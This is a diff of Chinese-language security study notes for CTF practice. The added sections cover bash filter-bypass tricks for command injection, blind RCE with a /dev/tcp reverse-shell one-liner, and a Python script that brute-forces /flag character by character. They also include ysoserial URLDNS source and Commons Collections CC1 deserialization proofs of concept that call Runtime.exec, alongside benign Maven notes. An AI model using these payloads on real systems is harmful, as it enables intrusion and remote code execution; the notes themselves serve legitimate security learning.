+  ```
+  #echo $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成
+  #当执行程序时，shell自动跟据PATH变量的值去搜索该程序
+  #shell在搜索时先搜索PATH环境变量中的第一个目录，没找到再接着搜索，如果找到则执行它，不会再继续搜索
+  echo $PATH 
+  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+  `echo $PATH| cut -c 8,9`t test
+  $(echo $PATH| cut -c 8,9)t flag
+  
+  反引号和$()都起命令替换作用
+  ```
+
+- 通配符绕过
+
+  >1. […]表示匹配方括号之中的任意一个字符
+  >
+  >2. {…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。
+  >
+  >3. {…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开
+  >
+  > ```
+  >soyamilk@DESKTOP-13QDS1A:~$ cat fl[a,b,c]a
+  >cat: 'fl[a,b,c]a': No such file or directory
+  >soyamilk@DESKTOP-13QDS1A:~$ cat fl[a,b,c]g
+  >flag{abc}
+  >soyamilk@DESKTOP-13QDS1A:~$ cat fl{a,b,c}g
+  >flag{abc}
+  >cat: flbg: No such file or directory
+  >cat: flcg: No such file or directory
+  > ```
+  >
+  >
+  >
+  >
+  >
+  >1. `*`（星号）：匹配任意长度的任意字符。
+  >
+  >- 例如：`*.txt` 匹配所有以 `.txt` 结尾的文件名。
+  >
+  >2. `?`（问号）：匹配任意单个字符。
+  >
+  >- 例如：`file?.txt` 匹配类似 `file1.txt`、`fileA.txt` 等文件名。
+  >
+  >3. `[characters]`：匹配字符集中的任意一个字符。
+  >
+  >- 例如：`file[0-9].txt` 匹配类似 `file1.txt`、`file5.txt` 等文件名。
+  >
+  >4. `[!characters]` 或 `[^characters]`：匹配不在字符集中的任意一个字符。
+  >
+  >- 例如：`file[!0-9].txt` 匹配不以数字结尾的文件名。
+  >
+  >5. `{pattern1,pattern2,...}`：匹配指定的模式。
+  >
+  >- 例如：`{file1,file2}.txt` 匹配 `file1.txt` 和 `file2.txt`。
+  >
+  >6. `()`：用于创建子模式，通常与其他通配符结合使用。
+  >
+  >- 例如：`file{1,2}.txt` 与 `{file1,file2}.txt` 等效。
+  >
+  >7. `\`：用于转义特殊字符，让其失去其特殊含义。
+  >
+  >- 例如：`file\?.txt` 匹配 `file?.txt` 文件。
+
+  ```
+  cat t?st
+  cat te*
+  cat t[a-z]st
+  cat t{a,b,c,d,e,f}st
+  ```
+
+- 利用`空`绕过
+
+  Bash 很多东西都是`空`，例如`''`、不存在的变量等等，就可以利用他们来隔开命令
+
+  ```
+  l''s：l''s == ls
+  
+  "l""s"或者'l''s'或者'l'"s"或者l"s"...
+  
+  l${anything}s：因为anything不存在，是空的，所以l${anything}s == ls，与l''s原理一样。
+  
+  l$1s、l$2s、...、l$9s：相比上面那个，这个方法不用{}也可以，因为这类数字名变量的名称界定比较特殊。至于它们是什么意思：
+  $0: Shell 本身，所以这里有个技巧是 {printf,"\167\150\157\141\155\151"} | $0
+  $1~$n: Shell 的各参数值。$1 是第 1 个参数、$2 是第 2 个参数，以此类推。
+  
+  l$*s、l$@s：它们都表示所有 Shell 参数的列表，不包括脚本本身（即 $1 - $n）。但是还是有区别的。举例：执行 test.sh 1 2 3时，"$*"表示"1 2 3"，而"$@"表示"1" "2" "3"。二者没有被引号引起来时是一样的都为"1 2 3"，只有当被引号引起来后才不一样。
+  
+  l$!s：$!代表 Shell 最后运行的后台 Process 的 PID。可以简单地理解为，例如一个命令放到后台运行：ping baidu.com & 后它的 PID，没有放到后台的命令那就是空。
+  
+  c$()at key：$()代表执行一个空的命令，返回值也为空。当然这样也是可以的：l$(echo s)。
+  l``s：这样当然也可以了。
+  ```
+
+  >`$0$1$2$3...`举例
+  >
+  >```
+  >soyamilk@DESKTOP-13QDS1A:~$ cat test01.sh
+  >echo $0
+  >echo $1
+  >echo $2
+  >soyamilk@DESKTOP-13QDS1A:~$ . test01.sh Hello World!
+  >-bash
+  >Hello
+  >World!
+  >soyamilk@DESKTOP-13QDS1A:~$
+  >```
+  >
+  >
+
+### 无回显RCE
+
+1. 重定向写文件
+
+   >`ls | xargs sed -i "s/die/echo/"`
+   >把die 替换成 echo
+   >`ls | xargs sed -i "s/exec/system/"`
+   >把exec 替换成 system
+
+   2023 hectf EZphp
+
+2. 反弹shell
+
+   ```
+   bash -c 'bash -i >& /dev/tcp/123.123.123.123/1234 0>&1'
+   ```
+
+3. 盲注
+
+   需要盲注的情况：
+
+   ```php
+   <?php
+   highlight_file(__FILE__);
+   
+   exec($_GET['cmd'],$output,$return_val);
+   if(!$return_val)echo "success";
+   else echo "fail";
+   ```
+
+   可以依据判据通过：
+
+   ```
+   if [ $(cut -c 1 /flag) = U ];then ls;else abcd;fi
+   ```
+
+   来逐位爆破`/flag`文件的内容。
+
+   盲注脚本：
+
+   ```python
+   import requests
+   flag=''
+   for i in range(1,100):
+       for j in '}{-abcdefghijklmnopqrstuvwxyz0123456789`':
+           url=f'http://localhost/?cmd=if [ $(cut -c {i} /f???) = {j} ]%0Athen ls%0Aelse abcd%0Afi'
+           print(url)
+           R=requests.get(url)
+           R.encoding='utf-8'
+           if 'success' in R.text:
+               flag+=j
+               break
+           if j=='`':
+               break
+   print(flag)
+   ```
+
+
+![img](daydayup.assets/1999159-20201002223158950-1419102854.png)
 
 ## 反弹shell
 
@@ -5323,7 +6207,7 @@ Class c = new Class()；
 >
 >![image-20230728171457674](daydayup.assets/image-20230728171457674.png)
 >
-> 原因是 Runtime 类的构造方法是私有的。
+>原因是 Runtime 类的构造方法是私有的。
 >
 >原因是`Runtime`类的构造方法是私有的。 有同学就比较好奇，为什么会有类的构造方法是私有的，难道他不想让用户使用这个类吗？这其实涉及 到很常见的设计模式：“单例模式”。（有时候工厂模式也会写成类似） 比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取：
 >
@@ -5375,7 +6259,7 @@ Class c = new Class()；
 >
 >```
 >public void hello(String[] names) {}
->public void hello(String...names) {}
+>public void hello(String... names) {}
 >```
 >
 >也由此，如果我们有一个数组，想传给hello函数，只需直接传即可：
@@ -5387,7 +6271,7 @@ Class c = new Class()；
 >
 >那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。
 >
-> 所以，我们将字符串数组的类`String[].class`传给`getConstructor`，获取`ProcessBuilder`的第二构造函数：
+>所以，我们将字符串数组的类`String[].class`传给`getConstructor`，获取`ProcessBuilder`的第二构造函数：
 >
 >```Java
 >Class clazz = Class.forName("java.lang.ProcessBuilder");
@@ -5461,7 +6345,25 @@ Class c = new Class()；
 >
 >为了解决这个问题，你需要将你的字符串数组包装在一个`Object[]`里，就像你在第一段代码中那样。这样，你就可以正确地调用`newInstance()`方法，而不会得到任何错误。
 >
->希望这个解释能够帮助你理解这个问题。如果你还有任何疑问，欢迎继续提问。
+>
+>
+>```java
+>    public static void main(String[] args) throws Exception {
+>        printNumbers(new int[]{1,2,3});
+>        printNumbers(1,2,3);
+>    }
+>
+>    public static void printNumbers(int... numbers) {
+>        System.out.println("The numbers are:");
+>        for (int num : numbers) {
+>            System.out.print(num + " ");
+>        }
+>        System.out.println();
+>    }
+>// 上述两种写法等价，int... numbers 等同于一个int数组，当传入多个int参数时会自动转换为int数组，如果传入int数组则直接使用int数组内数据
+>```
+>
+>
 >
 >((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}})).start();有佬知道为什么newinstance接受的是二维数组么
 >这个问题解释：
@@ -5688,7 +6590,504 @@ class student extends people{
 }
 ```
 
+### Maven的使用
+
+>IDEA自带mavan路径`IDEA安装路径\plugins\maven\lib\maven3\bin`
+
+#### 换仓库
+
+将仓库改成阿里云的镜像仓库
+
+打开maven里的conf文件，打开setings.xml文件，将下面mirror标签整体复制到mirrors标签的内部。
+
+```xml
+<mirrors>
+    <mirror>
+        <id>nexus-aliyun</id>
+        <mirrorOf>central</mirrorOf>
+        <name>Nexus aliyun</name>
+        <url>http://maven.aliyun.com/nexus/content/groups/public</url>
+    </mirror>
+</mirrors>
+```
+
+maven有三种仓库，分为：本地仓库、第三方仓库（私服）、中央仓库
+
+Maven中的坐标使用三个『向量』在『Maven的仓库』中唯一的定位到一个『jar』包。
+
+- **groupId**：公司或组织的 id，即公司或组织域名的倒序，通常也会加上项目名称
+
+  例如：groupId：com.javatv.maven
+
+- **artifactId**：一个项目或者是项目中的一个模块的 id，即模块的名称，将来作为 Maven 工程的工程名
+
+  例如：artifactId：auth
+
+  **version**：版本号
+
+- 例如：version：1.0.0
+
+![image-20231101142628470](daydayup.assets/image-20231101142628470.png)
+
+#### pom.xml
+
+pom.xml 配置文件就是 Maven 工程的核心配置文件
+
+```xml
+<!-- 当前Maven工程的坐标 -->
+<groupId>com.example</groupId>
+<artifactId>demo</artifactId>
+<version>0.0.1-SNAPSHOT</version>
+<name>demo</name>
+<description>Demo project for Spring Boot</description>
+<!-- 当前Maven工程的打包方式，可选值有下面三种： -->
+<!-- jar：表示这个工程是一个Java工程  -->
+<!-- war：表示这个工程是一个Web工程 -->
+<!-- pom：表示这个工程是“管理其他工程”的工程 -->
+<packaging>jar</packaging>
+<properties>
+    <!-- 工程构建过程中读取源码时使用的字符集 -->
+    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+</properties>
+<!-- 当前工程所依赖的jar包 -->
+<dependencies>
+    <!-- 使用dependency配置一个具体的依赖 -->
+    <dependency>
+        <!-- 在dependency标签内使用具体的坐标依赖我们需要的一个jar包 -->
+        <groupId>junit</groupId>
+        <artifactId>junit</artifactId>
+        <version>4.12</version>
+        <!-- scope标签配置依赖的范围 -->
+        <scope>test</scope>
+    </dependency>
+</dependencies>
+
+```
+
+依赖
+
+引入依赖存在一个范围，maven的依赖范围包括： `compile`，`provide`，`runtime`，`test`，`system`。
+
+*   **compile**：表示编译范围，指 A 在编译时依赖 B，该范围为**默认依赖范围**。编译范围的依赖会用在编译，测试，运行，由于运行时需要，所以编译范围的依赖会被打包。
+*   **provided**：provied 依赖只有当 jdk 或者一个容器已提供该依赖之后才使用。provide 依赖在编译和测试时需要，在运行时不需要。例如：servlet api被Tomcat容器提供了。
+*   **runtime**：runtime 依赖在运行和测试系统时需要，但在编译时不需要。例如：jdbc 的驱动包。由于运行时需要，所以 runtime 范围的依赖会被打包。
+*   **test**：test 范围依赖在编译和运行时都不需要，只在测试编译和测试运行时需要。例如：Junit。由于运行时不需要，所以 test 范围依赖不会被打包。
+*   **system**：system 范围依赖与 provide 类似，但是必须显示的提供一个对于本地系统中 jar 文件的路径。一般不推荐使用。
+
+![image-20231101142904364](daydayup.assets/image-20231101142904364.png)
+
+命令
+
+- clean：清理
+- compile：编译
+- test：运行测试
+- package：打包
+
+![image-20231101143856438](daydayup.assets/image-20231101143856438.png)
+
+> maven项目的项目目录
+> ![img](daydayup.assets/20201204225021484.png)
+
 ### 反序列化
 
+#### Java中的反序列化
 
+Java 序列化是把Java对象转换为字节序列的过程；而Java反序列化是把字节序列恢复为Java对象的过程。
+
+与PHP不同的是，Java序列化转化的字节序列不是明文，和Python序列化的数据一样不能够直接可读。
+
+要使一个Java对象可序列化，需要满足以下条件：
+
+1. 类必须实现`java.io.Serializable`接口，该接口是一个标记接口，没有任何方法。
+2. 所有非序列化的字段必须标记为`transient`关键字，表示不参与序列化。
+
+`Serializable`用来标识当前类可以被`ObjectOutputStream`序列化，以及被`ObjectInputStream`反序列化。
+
+序列化与反序列化当中有两个 **"特别特别特别特别特别"**重要的方法 ————`writeObject`和`readObject`。这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。
+
+![image-20231101144356805](daydayup.assets/image-20231101144356805.png)
+
+只要服务端反序列化数据，客户端传递类的`readObject`中代码会自动执行，基于攻击者在服务器上运行代码的能力。所以从根本上来说，Java 反序列化的漏洞的与`readObject`有关。
+
+实例：
+
+```java
+import java.io.*;
+
+class Person implements Serializable {
+    private static final long serialVersionUID = 1L;
+    private String name;
+    private int age;
+
+    public Person(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
+
+    public String getName() {
+        return name;
+    }
+
+    public int getAge() {
+        return age;
+    }
+}
+
+public class SerializationExample {
+    public static void main(String[] args) {
+        // 序列化对象
+        Person person = new Person("John", 30);
+        try {
+            FileOutputStream fileOut = new FileOutputStream("person.ser");
+            ObjectOutputStream out = new ObjectOutputStream(fileOut);
+            out.writeObject(person);
+            out.close();
+            fileOut.close();
+            System.out.println("Serialized data is saved in person.ser");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        // 反序列化对象
+        Person deserializedPerson = null;
+        try {
+            FileInputStream fileIn = new FileInputStream("person.ser");
+            ObjectInputStream in = new ObjectInputStream(fileIn);
+            deserializedPerson = (Person) in.readObject();
+            in.close();
+            fileIn.close();
+        } catch (IOException | ClassNotFoundException e) {
+            e.printStackTrace();
+        }
+
+        if (deserializedPerson != null) {
+            System.out.println("Deserialized data:");
+            System.out.println("Name: " + deserializedPerson.getName());
+            System.out.println("Age: " + deserializedPerson.getAge());
+        }
+    }
+}
+
+```
+
+#### URLDNS调用链
+
+[ysoserial/src/main/java/ysoserial/payloads/URLDNS.java at master · frohoff/ysoserial (github.com)](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)
+
+```Java
+package ysoserial.payloads;
+
+import java.io.IOException;
+import java.net.InetAddress;
+import java.net.URLConnection;
+import java.net.URLStreamHandler;
+import java.util.HashMap;
+import java.net.URL;
+
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
+import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
+
+
+/**
+ * A blog post with more details about this gadget chain is at the url below:
+ *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
+ *
+ *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
+ *   posting describing how he modified the Java Commons Collections gadget
+ *   in ysoserial to open a URL. This takes the same idea, but eliminates
+ *   the dependency on Commons Collections and does a DNS lookup with just
+ *   standard JDK classes.
+ *
+ *   The Java URL class has an interesting property on its equals and
+ *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
+ *   during a comparison (either equals or hashCode).
+ *
+ *   As part of deserialization, HashMap calls hashCode on each key that it
+ *   deserializes, so using a Java URL object as a serialized key allows
+ *   it to trigger a DNS lookup.
+ *
+ *   Gadget Chain:
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+ *
+ *
+ */
+@SuppressWarnings({ "rawtypes", "unchecked" })
+@PayloadTest(skip = "true")
+@Dependencies()
+@Authors({ Authors.GEBL })
+public class URLDNS implements ObjectPayload<Object> {
+
+        public Object getObject(final String url) throws Exception {
+
+                //Avoid DNS resolution during payload creation
+                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
+                URLStreamHandler handler = new SilentURLStreamHandler();
+
+                HashMap ht = new HashMap(); // HashMap that will contain the URL
+                URL u = new URL(null, url, handler); // URL to use as the Key
+                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+
+                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+
+                return ht;
+        }
+
+        public static void main(final String[] args) throws Exception {
+                PayloadRunner.run(URLDNS.class, args);
+        }
+
+        /**
+         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
+         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
+         * using the serialized object.</p>
+         *
+         * <b>Potential false negative:</b>
+         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
+         * second resolution.</p>
+         */
+        static class SilentURLStreamHandler extends URLStreamHandler {
+
+                protected URLConnection openConnection(URL u) throws IOException {
+                        return null;
+                }
+
+                protected synchronized InetAddress getHostAddress(URL u) {
+                        return null;
+                }
+        }
+}
+```
+
+先看`HashMap`的`readObject`方法，下面调用了`hash`方法，传入了`key`参数
+![image-20231101145008714](daydayup.assets/image-20231101145008714.png)
+
+>`readObject()`方法首先调用`s.defaultReadObject()`来读取默认的序列化字段。然后调用`reinitialize()`方法来重新初始化HashMap对象。
+>
+>接下来，代码读取和忽略了一些字段，如阈值、负载因子、桶的数量等。
+>
+>然后，代码读取并解析了HashMap中的键值对的数量，并根据读取到的数量和负载因子计算出了HashMap的容量和阈值。
+>
+>接着，代码使用`SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap)`来检查数组的类型和长度是否合法。
+>
+>然后，代码创建了一个新的Node数组作为HashMap的存储结构，并将其赋值给`table`字段。
+>
+>最后，代码使用循环读取键值对，并通过调用`putVal()`方法将键值对放入HashMap中。
+>
+>需要注意的是，这段代码是HashMap类的内部实现细节，用于在反序列化时恢复HashMap对象的状态。正常情况下，我们不需要直接调用这个方法，而是通过使用`ObjectInputStream`的`readObject()`方法来自动调用。
+>
+>这个示例代码展示了如何在自定义的`readObject()`方法中完成HashMap的反序列化过程，并恢复HashMap对象的状态。
+
+`hash`方法里面调用了`key`的`hashCode()`方法
+![image-20231101145303743](daydayup.assets/image-20231101145303743.png)
+
+
+而`URL`类的`hashCode`方法会调用到`URLStreamHandler`类的`hashCode`方法
+![image-20231101145559503](daydayup.assets/image-20231101145559503.png)
+
+
+`URLStreamHandler`类的`hashCode`方法会调用`getHostAddress`方法，该方法会获取本地主机的IP地址。如果主机字段为空或DNS解析失败，将返回null。
+![image-20231101145845836](daydayup.assets/image-20231101145845836.png)
+
+![image-20231101150014925](daydayup.assets/image-20231101150014925.png)
+
+所以，将`URL`类当做`HashMap`的`key`，让其进入`readObject`后调用`hash`方法传入`URL`，然后通过调用`URL`的`HashCode`到`URLStreamHandler`类的`hashCode`方法，最后调用`getHostAddress`方法。
+
+poc
+
+```java
+package org.example;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.util.HashMap;
+
+public class urldns {
+    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException {
+//        urlPoc uu = new urlPoc("https://25693.5M7O9BPTY2.dns.xms.la");
+//        uu.serUrlDns();
+        urlPoc.unserUrlDns();
+    }
+}
+class urlPoc {
+    private URL url;
+    private HashMap map;
+
+    public urlPoc(String u) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, MalformedURLException, NoSuchFieldException {
+        Class mapClass = HashMap.class;
+        this.map = (HashMap)mapClass.getConstructor().newInstance();
+
+        this.url = new URL(u);
+
+        map.put(url, "1");
+
+        Field hashcode = url.getClass().getDeclaredField("hashCode");
+        hashcode.setAccessible(true);
+        hashcode.set(url, -1);
+    }
+
+    public void serUrlDns() throws IOException {
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("urldns.ser"));
+        out.writeObject(this.map);
+    }
+
+    public static void unserUrlDns() throws IOException, ClassNotFoundException {
+        ObjectInputStream in = new ObjectInputStream(new FileInputStream("urldns.ser"));
+        HashMap hashmap = (HashMap) in.readObject();
+        System.out.println("unser urldns");
+    }
+}
+```
+
+![image-20231106200108684](daydayup.assets/image-20231106200108684.png)
+
+#### cc1
+
+先分析一个Java安全漫谈中最简单的cc链
+
+maven添加依赖
+
+```xml
+    <dependencies>
+        <dependency>
+            <groupId>commons-collections</groupId>
+            <artifactId>commons-collections</artifactId>
+            <version>3.1</version>
+        </dependency>
+    </dependencies>
+```
+
+poc
+
+```java
+package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import java.util.HashMap;
+import java.util.Map;
+
+public class cc01 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.getRuntime()),
+                new InvokerTransformer(
+                        "exec", 
+                        new Class[]{String.class}, 
+                        new Object[]{"C:\\WINDOWS\\system32\\calc.exe"}
+                ),
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        outerMap.put("test", "xxxx");
+    }
+}
+```
+
+`Transformer`是一个接口，`TransformedMap`在转换Map的新元素时，就会调⽤`transform`⽅法
+![image-20231107150708714](daydayup.assets/image-20231107150708714.png)
+
+`ConstantTransformer`是接口`Transformer`的实现类，在构造函数的时候传入一个实例，在调用`transform`方法时将其返回
+![image-20231107150832842](daydayup.assets/image-20231107150832842.png)
+
+`InvokerTransformer`是接口`Transformer`的实现类，在构造函数的时候传进来方法名称、参数类型和参数，在调⽤`transform`⽅法时传入对象`input`，然后调用`input`的对应的方法。
+![image-20231107151124522](daydayup.assets/image-20231107151124522.png)
+
+`ChainedTransformer`能够将一个`Transformer`数组连成串，挨个调用其中的`transform`方法
+![image-20231107153557268](daydayup.assets/image-20231107153557268.png)
+
+`TransformedMap` 可以用于在将值放入或获取值出来时，对其进行转换，对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。
+
+```Java
+Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+// outerMap就是修饰过后的map，innerMap就是要进行修饰的map，第二个参数是对key进行修饰的Transformers，第三个参数是对value进行修饰的Transformers。
+```
+
+![image-20231107154433255](daydayup.assets/image-20231107154433255.png)
+
+这样触发命令执行的地方就很明显了，当向`outerMap`里添加元素的时候，会调用`Transformer`数组里的方法，也就是调用`Runtime`的`exec`方法执行命令，将其进行反序列化后会报错，因为`Runtime`没法进行序列化，所以需要用到反射来进行序列化。
+
+poc
+
+```java
+package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.util.HashMap;
+import java.util.Map;
+
+public class cc01 {
+    public static void main(String[] args) throws Exception {
+//        Runtime demo =(Runtime) Runtime.class.getMethod("getRuntime").invoke(null);
+//        sercc01();
+        unsercc01();
+    }
+    
+    public static void sercc01() throws IOException {
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(
+                        "getMethod",
+                        new Class[]{
+                                String.class,
+                                Class[].class
+                        },
+                        new Object[]{
+                                "getRuntime",
+                                null
+                        }
+                ),
+                new InvokerTransformer(
+                        "invoke",
+                        new Class[] {
+                                Object.class,
+                                Object[].class
+                        },
+                        new Object[] {
+                                null,
+                                null
+                        }
+                ),
+                new InvokerTransformer(
+                        "exec",
+                        new Class[]{String.class},
+                        new Object[]{"C:\\WINDOWS\\system32\\calc.exe"}
+                ),
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        // outerMap就是修饰过后的map，innerMap就是要进行修饰的map
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./serDemo/cc01.ser"));
+        out.writeObject(outerMap);
+    }
+
+    public static void unsercc01() throws IOException, ClassNotFoundException {
+            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./serDemo/cc01.ser"));
+            Map hashmap = (Map) in.readObject();
+            hashmap.put("test", "xxxx");
+            System.out.println("unser cc01");
+    }
+
+}
+```
 
